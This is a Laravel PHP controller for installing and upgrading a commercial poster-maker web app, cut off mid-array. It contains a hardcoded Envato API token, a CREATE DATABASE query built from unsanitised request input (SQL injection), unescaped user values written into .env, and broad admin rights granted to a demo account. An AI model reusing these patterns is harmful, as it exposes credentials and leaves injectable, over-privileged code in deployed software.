<?php

namespace App\Http\Controllers;

use DB;
use PDF;
use Exception;
use Carbon\Carbon;
use App\Models\News;
use App\Models\User;
use App\Models\AdsSetting;
use App\Models\AppSetting;
use App\Models\Transaction;
use Illuminate\Support\Str;
use Illuminate\Http\Request;
use App\Models\PaymentSetting;
use Illuminate\Support\Facades\URL;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Storage;
use Spatie\Permission\Models\Permission;



class HomeController extends Controller
{
    public function index()
    {
        //return view('welcome');
       

    }

    public function install()
    {
         try {
         $dbconnect = DB::connection()->getPDO();
         $dbname = DB::connection()->getDatabaseName();
         echo "Connected successfully to the database. Database name is :".$dbname;
      } catch(Exception $e) {
         echo "Error in connecting to the database";
      }
        return view('install.purchase_code');
    }

    public function installation(Request $request) 
    {
        $url = URL::to('/');
        $userName = $request->userName;

        $personalToken = "MNCwSv473cZvV2k82dwL5M4rIMMTP0ZL";
        // $code = "da05ab13-5b03-4328-a777-07052643b2cb";
        $code = $request->purchase_code;
        
        // Surrounding whitespace can cause a 404 error, so trim it first
        $code = trim($code);
    
        // Make sure the code looks valid before sending it to Envato
        // This step is important - requests with incorrect formats can be blocked!
        if (!preg_match("/^([a-f0-9]{8})-(([a-f0-9]{4})-){3}([a-f0-9]{12})$/i", $code)) {
            return response()->json(['status'=> 'fail','error' => "Invalid purchase code"]);
        }
    
        $ch = curl_init();
        curl_setopt_array($ch, array(
            CURLOPT_URL => "https://api.envato.com/v3/market/author/sale?code=".$code,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 20,
            CURLOPT_HTTPHEADER => array(
                "Authorization: Bearer ".$personalToken,
                "User-Agent: Purchase code verification script"
            )
        ));
    
        $response = @curl_exec($ch);
        $responseCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);

        // var_dump($response);
    
        if (curl_errno($ch) > 0) {
            return response()->json(['status'=> 'fail','error' => "Failed to connect: " . curl_error($ch)]);
        }
    
        //  dd($responseCode);
        switch ($responseCode) {
            case 404: return response()->json(['status'=> 'fail','error' => "Invalid purchase code"]);
            case 403: return response()->json(['status'=> 'fail','error' => "The personal token is missing the required permission for this script"]);
            case 401: return response()->json(['status'=> 'fail','error' => "The personal token is invalid or has been deleted"]);
        }
    
        if ($responseCode !== 200) {
            return response()->json(['status'=> 'fail','error' => "Got status".$responseCode.", try again shortly"]);
        }
    
        $body = @json_decode($response);
    
        if ($body === false && json_last_error() !== JSON_ERROR_NONE) {
            return response()->json(['status'=> 'fail','error' => "Error parsing response, try again"]);
        }

        if($responseCode == 200)
        {
            if($body->buyer == $userName)
            {
                $this->storeConfiguration('ENVATO_USERNAME',$userName);
                $this->storeConfiguration('ENVATO_CODE',$request->purchase_code);

                return response()->json(['status'=> 'success','msg'=>'Purchase Code Validation Success!','purchase_code' => $request->purchase_code,'url' =>$url,'userName' => $userName]);
            }
            else
            {
                return response()->json(['status'=> 'fail','error' => "Invalid Envato Username!"]);
            }
        }
    }

    public function database_setup(Request $request)
    {
        $code = $request->purchase_code;
        return view('install.database_setup',compact('code'));
    }

    public function database_setup_post(Request $request)
    {
        $personalToken = "MNCwSv473cZvV2k82dwL5M4rIMMTP0ZL";
        //$code = "da05ab13-5b03-4328-a777-07052643b2cb";
        $code = $request->purchase_code;
        
        // Surrounding whitespace can cause a 404 error, so trim it first
        $code = trim($code);
    
        // Make sure the code looks valid before sending it to Envato
        // This step is important - requests with incorrect formats can be blocked!
        if (!preg_match("/^([a-f0-9]{8})-(([a-f0-9]{4})-){3}([a-f0-9]{12})$/i", $code)) {
            return redirect()->back()->with(['message' => "Invalid purchase code"]);
        }
    
        $ch = curl_init();
        curl_setopt_array($ch, array(
            CURLOPT_URL => "https://api.envato.com/v3/market/author/sale?code=".$code,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 20,
            CURLOPT_HTTPHEADER => array(
                "Authorization: Bearer ".$personalToken,
                "User-Agent: Purchase code verification script"
            )
        ));
    
        $response = @curl_exec($ch);
        $responseCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    
        if (curl_errno($ch) > 0) {
            return redirect()->back()->with(['message' => "Failed to connect: " . curl_error($ch)]);
        }
    
        //  dd($responseCode);
        switch ($responseCode) {
            case 404: return redirect()->back()->with(['message' => "Invalid purchase code"]);
            case 403: return redirect()->back()->with(['message' => "The personal token is missing the required permission for this script"]);
            case 401: return redirect()->back()->with(['message' => "The personal token is invalid or has been deleted"]);
        }
    
        if ($responseCode !== 200) {
            return redirect()->back()->with(['message' => "Got status".$responseCode.", try again shortly"]);
        }
    
        $body = @json_decode($response);
    
        if ($body === false && json_last_error() !== JSON_ERROR_NONE) {
            return redirect()->back()->with(['message' => "Error parsing response, try again"]);
        }

        if($responseCode == 200)
        {
            if($body->buyer == env('ENVATO_USERNAME') &&  $code == env('ENVATO_CODE'))
            {
            $env = file_get_contents(base_path('.env'));
            $dbName = $request->get('database_name');
            $dbHost = $request->get('database_host');
            $dbUsername = $request->get('database_username');
            $dbPassword = $request->get('database_password');
            $databaseSetting = '
DB_HOST="' . $dbHost . '"
DB_DATABASE="' . $dbName . '"
DB_USERNAME="' . $dbUsername . '"
DB_PASSWORD="' . $dbPassword . '"
';
    
            // @ignoreCodingStandard
            $rows = explode("\n", $env);
            $unwanted = "DB_HOST|DB_DATABASE|DB_USERNAME|DB_PASSWORD";
            $cleanArray = preg_grep("/$unwanted/i", $rows, PREG_GREP_INVERT);
    
            $cleanString = implode("\n", $cleanArray);
    
            $env = $cleanString . $databaseSetting;
            try {
                $dbh = new \PDO('mysql:host=' . $dbHost, $dbUsername, $dbPassword);
    
                $dbh->setAttribute(\PDO::ATTR_ERRMODE, \PDO::ERRMODE_EXCEPTION);
    
                // First check if database exists
                $stmt = $dbh->query('CREATE DATABASE IF NOT EXISTS ' . $dbName . ' CHARACTER SET utf8 COLLATE utf8_general_ci;');
                // Save settings in session
                session_start();
                $_SESSION['db_username'] = $dbUsername;
                $_SESSION['db_password'] = $dbPassword;
                $_SESSION['db_name'] = $dbName;
                $_SESSION['db_host'] = $dbHost;
                $_SESSION['db_success'] = true;
                $message = 'Database settings correct';
    
                try {
                    file_put_contents(base_path('.env'), $env);
                    return redirect('migration');
                } catch (Exception $e) {
                    $message = "Unable to save the .env file, Please create it manually";
                }

                return redirect()->back()->with(['message' => $message]);
    
            } catch (\PDOException $e) {
                return redirect()->back()->with(['message' => 'DB Error: ' . $e->getMessage()]);
    
            } catch (\Exception $e) {
    
                return redirect()->back()->with(['message' => 'DB Error: ' . $e->getMessage()]);
    
            }
            }
            else
            {
                return redirect()->back()->with(['message' => "Invalid Envato Username and Code!"]);
            }
        }
        else
        {
            return redirect()->route('install');
        }
    }
 
    public function migration()
    {
        $database = DB::unprepared(File::get(storage_path('brand_kit.sql')));

        if ($database == 'true') 
        {
            file_put_contents(storage_path('installed'), 'brand_kit');
            return redirect()->route('login');
        } else {
            abort(404);
        }
    }

    private function storeConfiguration($key, $value)
    {
        $path = base_path('.env');

        $envkey = config('constants.envanto.'.$key);

        if (file_exists($path)) {
            file_put_contents($path, str_replace(
                $key . '=' . $envkey, $key . '=' . $value, file_get_contents($path)
            ));         
        }
        else
        {
            file_put_contents($path, $key . '=' . $value . PHP_EOL, FILE_APPEND);
        }
    }

    public function update_version()
    {
        return view('updateVersion');
    }

    public function update_version_post()
    {
        if(file_get_contents(storage_path('installed')) == "brand_kit")
        {
            $database1 = DB::unprepared(File::get(storage_path('brand_kit_update_1.sql')));

            $transaction = Transaction::get();
            $news = News::get();
            $user = User::get();
            foreach($transaction as $t)
            {
                $transaction_data = Transaction::find($t->id);
                $new_date = Carbon::createFromFormat('d M, y',$transaction_data->date)->format('Y-m-d');
                $transaction_data->date = $new_date;
                $transaction_data->save();
            }
            foreach($news as $n)
            {
                $news_data = News::find($n->id);
                $new_date = Carbon::createFromFormat('d M, y',$news_data->date)->format('Y-m-d');
                $news_data->date = $new_date;
                $news_data->save();
            }
            foreach($user as $u)
            {
                $user_data = User::find($u->id);
                if($user_data->subscription_start_date != null)
                {
                    $start_date = Carbon::createFromFormat('d M, y',$user_data->subscription_start_date)->format('Y-m-d');
                    $user_data->subscription_start_date = $start_date;
                }
                if($user_data->subscription_end_date != null)
                {
                    $end_date = Carbon::createFromFormat('d M, y',$user_data->subscription_end_date)->format('Y-m-d');
                    $user_data->subscription_end_date = $end_date;
                }
                $user_data->save();
            }

            $database2 = DB::unprepared(File::get(storage_path('brand_kit_update_2.sql')));

            AppSetting::create(['key_name' => 'product_enable', 'key_value' => '1']);
            PaymentSetting::create(['key_name' => 'payment_gateway', 'key_value' => 'Razorpay']);
            PaymentSetting::create(['key_name' => 'cashfree_key_id', 'key_value' => '']);
            PaymentSetting::create(['key_name' => 'cashfree_key_secret', 'key_value' => '']);
            PaymentSetting::where("key_name","razorpay_enable")->delete();
            AppSetting::create(['key_name' => 'whatsapp_contact_enable', 'key_value' => '1']);
            AppSetting::create(['key_name' => 'whatsapp_number', 'key_value' => '1234567890']);

            $database3 = DB::unprepared(File::get(storage_path('brand_kit_update_3.sql')));

            $user = User::get();
            foreach($user as $u)
            {
                $user_data = User::find($u->id);
                $user_data->referral_code = strtoupper(str::random(10));
                $user_data->save();
            }

            $payment_get = Transaction::get(); 
            foreach($payment_get as $pay)
            {
                if($pay->payment_type == null)
                {
                    $trans = Transaction::find($pay->id); 
                    $trans->payment_type = "Razorpay";
                    $trans->save();
                }
            }

            File::makeDirectory('./uploads/video');
            File::makeDirectory('./uploads/pdf');
            File::makeDirectory('./uploads/template');
            copy('./assets/images/pdf/card1.png', './uploads/card1.png');
            copy('./assets/images/pdf/card2.png', './uploads/card2.png');
            copy('./assets/images/pdf/card3.png', './uploads/card3.png');
            copy('./assets/images/pdf/card4.png', './uploads/card4.png');
            copy('./assets/images/pdf/card5.png', './uploads/card5.png');
            copy('./assets/images/pdf/card6.png', './uploads/card6.png');
            copy('./assets/images/pdf/card7.png', './uploads/card7.png');
            copy('./assets/images/pdf/card8.png', './uploads/card8.png');
            copy('./assets/images/pdf/card9.png', './uploads/card9.png');
            copy('./assets/images/pdf/card10.png', './uploads/card10.png');
            copy('./assets/images/no-user.jpg', './uploads/no-user.jpg');

            Permission::create(['name' => 'Video']);
            Permission::create(['name' => 'CouponCode']);
            Permission::create(['name' => 'StickerCategory']);
            Permission::create(['name' => 'Sticker']);
            Permission::create(['name' => 'Offer']);
            Permission::create(['name' => 'BusinessCard']);
            Permission::create(['name' => 'ProductCategory']);
            Permission::create(['name' => 'Product']);
            Permission::create(['name' => 'Inquiry']);
            Permission::create(['name' => 'PosterMaker']);
            Permission::create(['name' => 'ReferralSystem']);
            Permission::create(['name' => 'WithdrawRequest']);
            Permission::create(['name' => 'BusinessSubCategory']);
            Permission::create(['name' => 'PosterCategory']);
            Permission::create(['name' => 'WhatsAppMessage']);

            $users = User::get();
            foreach($users as $user)
            {
                if($user->user_type == "Super Admin")
                {
                    $user->givePermissionTo(['Language','Category','CategoryFrame','Festival','FestivalFrame','CustomCategory',
                                            'CustomFrame','BusinessCategory','BusinessSubCategory','BusinessFrame','StickerCategory','Sticker',"ProductCategory",
                                            "Product","Inquiry","PosterMaker","PosterCategory","ReferralSystem","WithdrawRequest",'Video','News','Stories',
                                            'Users','Businesses','SubscriptionPlan','CouponCode','BusinessCard','FinancialStatistics','Entry','Subject',
                                            'Notification','WhatsAppMessage','Offer','UserRoleManagement','Settings']);
                }
                if($user->user_type == "Demo")
                {
                    $user->givePermissionTo(['Language','Category','CategoryFrame','Festival','FestivalFrame','CustomCategory',
                                            'CustomFrame','BusinessCategory','BusinessSubCategory','BusinessFrame','StickerCategory','Sticker',"ProductCategory",
                                            "Product","Inquiry","PosterMaker","PosterCategory","ReferralSystem","WithdrawRequest",'Video','News', 'Stories',
                                            'Users','Businesses','SubscriptionPlan','CouponCode','BusinessCard','FinancialStatistics','Entry','Subject',
                                            'Notification','WhatsAppMessage','Offer','UserRoleManagement','Settings']);
                }
            }

            if(!env('SPACES_ACCESS_KEY_ID')) 
            {
                file_put_contents(base_path('.env'),'
                
SPACES_ACCESS_KEY_ID=',FILE_APPEND);
            }
            if(!env('SPACES_SECRET_ACCESS_KEY')) 
            {
                file_put_contents(base_path('.env'),'SPACES_SECRET_ACCESS_KEY=',FILE_APPEND);
            }
            if(!env('SPACES_DEFAULT_REGION')) 
            {
                file_put_contents(base_path('.env'),'SPACES_DEFAULT_REGION=',FILE_APPEND);
            }
            if(!env('SPACES_BUCKET')) 
            {
                file_put_contents(base_path('.env'),'SPACES_BUCKET=', FILE_APPEND);
            }
            if (!env('SPACES_URL')) 
            {
                file_put_contents(base_path('.env'),'SPACES_URL=', FILE_APPEND);
            }
            if (!env('SPACES_ENDPOINT')) 
            {
                file_put_contents(base_path('.env'),'SPACES_ENDPOINT=', FILE_APPEND);
            }

            $database4 = DB::unprepared(File::get(storage_path('brand_kit_update_4.sql')));
            $database5 = DB::unprepared(File::get(storage_path('brand_kit_update_5.sql')));

            AppSetting::create(['key_name' => 'licence_active', 'key_value' => '0']);
            AppSetting::create(['key_name' => 'currency', 'key_value' => 'INR']);

            AdsSetting::create(['key_name' => 'rewarded_ads_enable', 'key_value' => '0']);
            AdsSetting::create(['key_name' => 'rewarded_ads_id', 'key_value' => '']);

            PaymentSetting::create(['key_name' => 'razorpay_enable', 'key_value' => '1']);
            PaymentSetting::create(['key_name' => 'cashfree_enable', 'key_value' => '1']);
            PaymentSetting::create(['key_name' => 'offline_enable', 'key_value' => '1']);
            PaymentSetting::create(['key_name' => 'offline_payment_details', 'key_value' => '']);
            PaymentSetting::where('key_name','payment_gateway')->delete();
            PaymentSetting::create(['key_name' => 'stripe_enable', 'key_value' => '0']);
            PaymentSetting::create(['key_name' => 'stripe_publishable_Key', 'key_value' => '']);
            PaymentSetting::create(['key_name' => 'stripe_secret_key', 'key_value' => '']);
            PaymentSetting::create(['key_name' => 'paytm_enable', 'key_value' => '0']);
            PaymentSetting::create(['key_name' => 'paytm_merchant_id', 'key_value' => '']);
            PaymentSetting::create(['key_name' => 'paytm_merchant_key', 'key_value' => '']);
            PaymentSetting::create(['key_name' => 'cashfree_type', 'key_value' => 'Test']);
            PaymentSetting::create(['key_name' => 'paytm_type', 'key_value' => 'Test']);

            $user_null = User::where('user_type',null)->get();
            $user_normal = User::where('user_type',"Normal")->get();
            foreach($user_null as $null)
            {
                $u = User::find($null->id);
                $u->user_type = "User";
                $u->save();
            }
            foreach($user_normal as $normal)
            {
                $uu = User::find($normal->id);
                $uu->user_type = "User";
                $uu->save();
            }

            $users = User::get();
            foreach($users as $user)
            {
                if($user->email == "demo2023@gmail.com")
                {
                    $user->givePermissionTo(['Language','Category','CategoryFrame','Festival','FestivalFrame','CustomCategory',
                                            'CustomFrame','BusinessCategory','BusinessSubCategory','BusinessFrame','StickerCategory','Sticker',"ProductCategory",
                                            "Product","Inquiry","PosterCategory","PosterMaker","ReferralSystem","WithdrawRequest",'Video','News', 'Stories',
                                            'Users','Businesses','SubscriptionPlan','CouponCode','BusinessCard','FinancialStatistics','Entry','Subject',
                                            'Notification','WhatsAppMessage','Offer','UserRoleManagement','Settings']);
                }
            }

            $uu = User::where('user_type','Super Admin')->get();
            foreach($uu as $val)
            {
                $user_user = User::find($val->id);
                $user_user->email_verified_at = date('Y-m-d H:i:s');
                $user_user->save();
            }

            if ($database1 == 'true' && $database2 == 'true' && $database3 == 'true' && $database4 == 'true' && $database5 == 'true') 
            {
                $url = URL::to('/');
                $version = "8";
                
                $client = new \GuzzleHttp\Client();
                $response = $client->request('POST', 'https://viplan.in/api/licence-update', [
                    'form_params' => [
                        'url' => $url,
                        'version' => $version,
                    ]
                ]);
                
                file_put_contents(storage_path('installed'), 'brand_kit6');
                return redirect()->route('login');
            } else {
                abort(404);
            }
        }
        elseif(file_get_contents(storage_path('installed')) == "brand_kit1")
        {
            $transaction = Transaction::get();
            $news = News::get();
            $user = User::get();
            foreach($transaction as $t)
            {
                $transaction_data = Transaction::find($t->id);
                $new_date = Carbon::createFromFormat('d M, y',$transaction_data->date)->format('Y-m-d');
                $transaction_data->date = $new_date;
                $transaction_data->save();
            }
            foreach($news as $n)
            {
                $news_data = News::find($n->id);
                $new_date = Carbon::createFromFormat('d M, y',$news_data->date)->format('Y-m-d');
                $news_data->date = $new_date;
                $news_data->save();
            }
            foreach($user as $u)
            {
                $user_data = User::find($u->id);
                if($user_data->subscription_start_date != null)
                {
                    $start_date = Carbon::createFromFormat('d M, y',$user_data->subscription_start_date)->format('Y-m-d');
                    $user_data->subscription_start_date = $start_date;
                }
                if($user_data->subscription_end_date != null)
                {
                    $end_date = Carbon::createFromFormat('d M, y',$user_data->subscription_end_date)->format('Y-m-d');
                    $user_data->subscription_end_date = $end_date;
                }
                $user_data->save();
            }

            AppSetting::create(['key_name' => 'product_enable', 'key_value' => '1']);
            PaymentSetting::create(['key_name' => 'payment_gateway', 'key_value' => 'Razorpay']);
            PaymentSetting::create(['key_name' => 'cashfree_key_id', 'key_value' => '']);
            PaymentSetting::create(['key_name' => 'cashfree_key_secret', 'key_value' => '']);
            PaymentSetting::where("key_name","razorpay_enable")->delete();
            AppSetting::create(['key_name' => 'whatsapp_contact_enable', 'key_value' => '1']);
            AppSetting::create(['key_name' => 'whatsapp_number', 'key_value' => '1234567890']);
        
            $database2 = DB::unprepared(File::get(storage_path('brand_kit_update_2.sql')));
            $database3 = DB::unprepared(File::get(storage_path('brand_kit_update_3.sql')));

            File::makeDirectory('./uploads/pdf');
            File::makeDirectory('./uploads/template');
            copy('./assets/images/pdf/card1.png', './uploads/card1.png');
            copy('./assets/images/pdf/card2.png', './uploads/card2.png');
            copy('./assets/images/pdf/card3.png', './uploads/card3.png');
            copy('./assets/images/pdf/card4.png', './uploads/card4.png');
            copy('./assets/images/pdf/card5.png', './uploads/card5.png');
            copy('./assets/images/pdf/card6.png', './uploads/card6.png');
            copy('./assets/images/pdf/card7.png', './uploads/card7.png');
            copy('./assets/images/pdf/card8.png', './uploads/card8.png');
            copy('./assets/images/pdf/card9.png', './uploads/card9.png');
            copy('./assets/images/pdf/card10.png', './uploads/card10.png');
            copy('./assets/images/no-user.jpg', './uploads/no-user.jpg');

            $user = User::get();
            foreach($user as $u)
            {
                $user_data = User::find($u->id);
                $user_data->referral_code = strtoupper(str::random(10));
                $user_data->save();
            }

            $payment_get = Transaction::get(); 
            foreach($payment_get as $pay)
            {
                if($pay->payment_type == null)
                {
                    $trans = Transaction::find($pay->id); 
                    $trans->payment_type = "Razorpay";
                    $trans->save();
                }
            }

            Permission::create(['name' => 'StickerCategory']);
            Permission::create(['name' => 'Sticker']);
            Permission::create(['name' => 'Offer']);
            Permission::create(['name' => 'BusinessCard']);
            Permission::create(['name' => 'ProductCategory']);
            Permission::create(['name' => 'Product']);
            Permission::create(['name' => 'Inquiry']);
            Permission::create(['name' => 'PosterMaker']);
            Permission::create(['name' => 'ReferralSystem']);
            Permission::create(['name' => 'WithdrawRequest']);
            Permission::create(['name' => 'BusinessSubCategory']);
            Permission::create(['name' => 'PosterCategory']);
            Permission::create(['name' => 'WhatsAppMessage']);

            $users = User::get();
            foreach($users as $user)
            {
                if($user->user_type == "Super Admin")
                {
                    $user->givePermissionTo(['Language','Category','CategoryFrame','Festival','FestivalFrame','CustomCategory',
                                            'CustomFrame','BusinessCategory','BusinessSubCategory','BusinessFrame','StickerCategory','Sticker',"ProductCategory",
                                            "Product","Inquiry","PosterMaker","PosterCategory","ReferralSystem","WithdrawRequest",'Video','News','Stories',
                                            'Users','Businesses','SubscriptionPlan','CouponCode','BusinessCard','FinancialStatistics','Entry','Subject',
                                            'Notification','WhatsAppMessage','Offer','UserRoleManagement','Settings']);
                }
                if($user->user_type == "Demo")
                {
                    $user->givePermissionTo(['Language','Category','CategoryFrame','Festival','FestivalFrame','CustomCategory',
                                            'CustomFrame','BusinessCategory','BusinessSubCategory','BusinessFrame','StickerCategory','Sticker',"ProductCategory",
                                            "Product","Inquiry","PosterMaker","PosterCategory","ReferralSystem","WithdrawRequest",'Video','News', 'Stories',
                                            'Users','Businesses','SubscriptionPlan','CouponCode','BusinessCard','FinancialStatistics','Entry','Subject',
                                            'Notification','WhatsAppMessage','Offer','UserRoleManagement','Settings']);
                }
            }

            if(!env('SPACES_ACCESS_KEY_ID')) 
            {
                file_put_contents(base_path('.env'),'
                
SPACES_ACCESS_KEY_ID=',FILE_APPEND);
            }
            if(!env('SPACES_SECRET_ACCESS_KEY')) 
            {
                file_put_contents(base_path('.env'),'SPACES_SECRET_ACCESS_KEY=',FILE_APPEND);
            }
            if(!env('SPACES_DEFAULT_REGION')) 
            {
                file_put_contents(base_path('.env'),'SPACES_DEFAULT_REGION=',FILE_APPEND);
            }
            if(!env('SPACES_BUCKET')) 
            {
                file_put_contents(base_path('.env'),'SPACES_BUCKET=', FILE_APPEND);
            }
            if (!env('SPACES_URL')) 
            {
                file_put_contents(base_path('.env'),'SPACES_URL=', FILE_APPEND);
            }
            if (!env('SPACES_ENDPOINT')) 
            {
                file_put_contents(base_path('.env'),'SPACES_ENDPOINT=', FILE_APPEND);
            }

            $database4 = DB::unprepared(File::get(storage_path('brand_kit_update_4.sql')));
            $database5 = DB::unprepared(File::get(storage_path('brand_kit_update_5.sql')));

            AppSetting::create(['key_name' => 'licence_active', 'key_value' => '0']);
            AppSetting::create(['key_name' => 'currency', 'key_value' => 'INR']);

            AdsSetting::create(['key_name' => 'rewarded_ads_enable', 'key_value' => '0']);
            AdsSetting::create(['key_name' => 'rewarded_ads_id', 'key_value' => '']);

            PaymentSetting::create(['key_name' => 'razorpay_enable', 'key_value' => '1']);
            PaymentSetting::create(['key_name' => 'cashfree_enable', 'key_value' => '1']);
            PaymentSetting::create(['key_name' => 'offline_enable', 'key_value' => '1']);
            PaymentSetting::create(['key_name' => 'offline_payment_details', 'key_value' => '']);
            PaymentSetting::where('key_name','payment_gateway')->delete();
            PaymentSetting::create(['key_name' => 'stripe_enable', 'key_value' => '0']);
            PaymentSetting::create(['key_name' => 'stripe_publishable_Key', 'key_value' => '']);
            PaymentSetting::create(['key_name' => 'stripe_secret_key', 'key_value' => '']);
            PaymentSetting::create(['key_name' => 'paytm_enable', 'key_value' => '0']);
            PaymentSetting::create(['key_name' => 'paytm_merchant_id', 'key_value' => '']);
            PaymentSetting::create(['key_name' => 'paytm_merchant_key', 'key_value' => '']);
            PaymentSetting::create(['key_name' => 'cashfree_type', 'key_value' => 'Test']);
            PaymentSetting::create(['key_name' => 'paytm_type', 'key_value' => 'Test']);

            $user_null = User::where('user_type',null)->get();
            $user_normal = User::where('user_type',"Normal")->get();
            foreach($user_null as $null)
            {
                $u = User::find($null->id);
                $u->user_type = "User";
                $u->save();
            }
            foreach($user_normal as $normal)
            {
                $uu = User::find($normal->id);
                $uu->user_type = "User";
                $uu->save();
            }

            $users = User::get();
            foreach($users as $user)
            {
                if($user->email == "demo2023@gmail.com")
                {
                    $user->givePermissionTo(['Language','Category','CategoryFrame','Festival','FestivalFrame','CustomCategory',
                                            'CustomFrame','BusinessCategory','BusinessSubCategory','BusinessFrame','StickerCategory','Sticker',"ProductCategory",
                                            "Product","Inquiry","PosterCategory","PosterMaker","ReferralSystem","WithdrawRequest",'Video','News', 'Stories',
                                            'Users','Businesses','SubscriptionPlan','CouponCode','BusinessCard','FinancialStatistics','Entry','Subject',
                                            'Notification','WhatsAppMessage','Offer','UserRoleManagement','Settings']);
                }
            }

            $uu = User::where('user_type','Super Admin')->get();
            foreach($uu as $val)
            {
                $user_user = User::find($val->id);
                $user_user->email_verified_at = date('Y-m-d H:i:s');
                $user_user->save();
            }

            if ($database2 == 'true' && $database3 == 'true' && $database4 == 'true' && $database5 == 'true') 
            {
                $url = URL::to('/');
                $version = "8";
                
                $client = new \GuzzleHttp\Client();
                $response = $client->request('POST', 'https://viplan.in/api/licence-update', [
                    'form_params' => [
                        'url' => $url,
                        'version' => $version,
                    ]
                ]);

                file_put_contents(storage_path('installed'), 'brand_kit6');
                return redirect()->route('login');
            } else {
                abort(404);
            }
        }
        elseif(file_get_contents(storage_path('installed')) == "brand_kit2")
        {
            AppSetting::create(['key_name' => 'product_enable', 'key_value' => '1']);
            PaymentSetting::create(['key_name' => 'payment_gateway', 'key_value' => 'Razorpay']);
            PaymentSetting::create(['key_name' => 'cashfree_key_id', 'key_value' => '']);
            PaymentSetting::create(['key_name' => 'cashfree_key_secret', 'key_value' => '']);
            PaymentSetting::where("key_name","razorpay_enable")->delete();
            AppSetting::create(['key_name' => 'whatsapp_contact_enable', 'key_value' => '1']);
            AppSetting::create(['key_name' => 'whatsapp_number', 'key_value' => '1234567890']);

            $database3 = DB::unprepared(File::get(storage_path('brand_kit_update_3.sql')));
            
            if(!File::isDirectory('./uploads/template'))
            {
                File::makeDirectory('./uploads/template');
            }

            $user = User::get();
            foreach($user as $u)
            {
                $user_data = User::find($u->id);
                $user_data->referral_code = strtoupper(str::random(10));
                $user_data->save();
            }

            $payment_get = Transaction::get(); 
            foreach($payment_get as $pay)
            {
                if($pay->payment_type == null)
                {
                    $trans = Transaction::find($pay->id); 
                    $trans->payment_type = "Razorpay";
                    $trans->save();
                }
            }

            Permission::create(['name' => 'ProductCategory']);
            Permission::create(['name' => 'Product']);
            Permission::create(['name' => 'Inquiry']);
            Permission::create(['name' => 'PosterMaker']);
            Permission::create(['name' => 'ReferralSystem']);
            Permission::create(['name' => 'WithdrawRequest']);
            Permission::create(['name' => 'BusinessSubCategory']);
            Permission::create(['name' => 'PosterCategory']);
            Permission::create(['name' => 'WhatsAppMessage']);

            $users = User::get();
            foreach($users as $user)
            {
                if($user->user_type == "Super Admin")
                {
                    $user->givePermissionTo(['Language','Category','CategoryFrame','Festival','FestivalFrame','CustomCategory',
                                            'CustomFrame','BusinessCategory','BusinessSubCategory','BusinessFrame','StickerCategory','Sticker',"ProductCategory",
                                            "Product","Inquiry","PosterMaker","PosterCategory","ReferralSystem","WithdrawRequest",'Video','News','Stories',
                                            'Users','Businesses','SubscriptionPlan','CouponCode','BusinessCard','FinancialStatistics','Entry','Subject',
                                            'Notification','WhatsAppMessage','Offer','UserRoleManagement','Settings']);
                }
                if($user->user_type == "Demo")
                {
                    $user->givePermissionTo(['Language','Category','CategoryFrame','Festival','FestivalFrame','CustomCategory',
                                            'CustomFrame','BusinessCategory','BusinessSubCategory','BusinessFrame','StickerCategory','Sticker',"ProductCategory",
                                            "Product","Inquiry","PosterMaker","PosterCategory","ReferralSystem","WithdrawRequest",'Video','News', 'Stories',
                                            'Users','Businesses','SubscriptionPlan','CouponCode','BusinessCard','FinancialStatistics','Entry','Subject',
                                            'Notification','WhatsAppMessage','Offer','UserRoleManagement','Settings']);
                }
            }

            if(!env('SPACES_ACCESS_KEY_ID')) 
            {
                file_put_contents(base_path('.env'),'
                
SPACES_ACCESS_KEY_ID=',FILE_APPEND);
            }
            if(!env('SPACES_SECRET_ACCESS_KEY')) 
            {
                file_put_contents(base_path('.env'),'SPACES_SECRET_ACCESS_KEY=',FILE_APPEND);
            }
            if(!env('SPACES_DEFAULT_REGION')) 
            {
                file_put_contents(base_path('.env'),'SPACES_DEFAULT_REGION=',FILE_APPEND);
            }
            if(!env('SPACES_BUCKET')) 
            {
                file_put_contents(base_path('.env'),'SPACES_BUCKET=', FILE_APPEND);
            }
            if (!env('SPACES_URL')) 
            {
                file_put_contents(base_path('.env'),'SPACES_URL=', FILE_APPEND);
            }
            if (!env('SPACES_ENDPOINT')) 
            {
                file_put_contents(base_path('.env'),'SPACES_ENDPOINT=', FILE_APPEND);
            }

            $database4 = DB::unprepared(File::get(storage_path('brand_kit_update_4.sql')));
            $database5 = DB::unprepared(File::get(storage_path('brand_kit_update_5.sql')));

            AppSetting::create(['key_name' => 'licence_active', 'key_value' => '0']);
            AppSetting::create(['key_name' => 'currency', 'key_value' => 'INR']);

            AdsSetting::create(['key_name' => 'rewarded_ads_enable', 'key_value' => '0']);
            AdsSetting::create(['key_name' => 'rewarded_ads_id', 'key_value' => '']);

            PaymentSetting::create(['key_name' => 'razorpay_enable', 'key_value' => '1']);
            PaymentSetting::create(['key_name' => 'cashfree_enable', 'key_value' => '1']);
            PaymentSetting::create(['key_name' => 'offline_enable', 'key_value' => '1']);
            PaymentSetting::create(['key_name' => 'offline_payment_details', 'key_value' => '']);
            PaymentSetting::where('key_name','payment_gateway')->delete();
            PaymentSetting::create(['key_name' => 'stripe_enable', 'key_value' => '0']);
            PaymentSetting::create(['key_name' => 'stripe_publishable_Key', 'key_value' => '']);
            PaymentSetting::create(['key_name' => 'stripe_secret_key', 'key_value' => '']);
            PaymentSetting::create(['key_name' => 'paytm_enable', 'key_value' => '0']);
            PaymentSetting::create(['key_name' => 'paytm_merchant_id', 'key_value' => '']);
            PaymentSetting::create(['key_name' => 'paytm_merchant_key', 'key_value' => '']);
            PaymentSetting::create(['key_name' => 'cashfree_type', 'key_value' => 'Test']);
            PaymentSetting::create(['key_name' => 'paytm_type', 'key_value' => 'Test']);

            $user_null = User::where('user_type',null)->get();
            $user_normal = User::where('user_type',"Normal")->get();
            foreach($user_null as $null)
            {
                $u = User::find($null->id);
                $u->user_type = "User";
                $u->save();
            }
            foreach($user_normal as $normal)
            {
                $uu = User::find($normal->id);
                $uu->user_type = "User";
                $uu->save();
            }

            $users = User::get();
            foreach($users as $user)
            {
                if($user->email == "demo2023@gmail.com")
                {
                    $user->givePermissionTo(['Language','Category','CategoryFrame','Festival','FestivalFrame','CustomCategory',
                                            'CustomFrame','BusinessCategory','BusinessSubCategory','BusinessFrame','StickerCategory','Sticker',"ProductCategory",
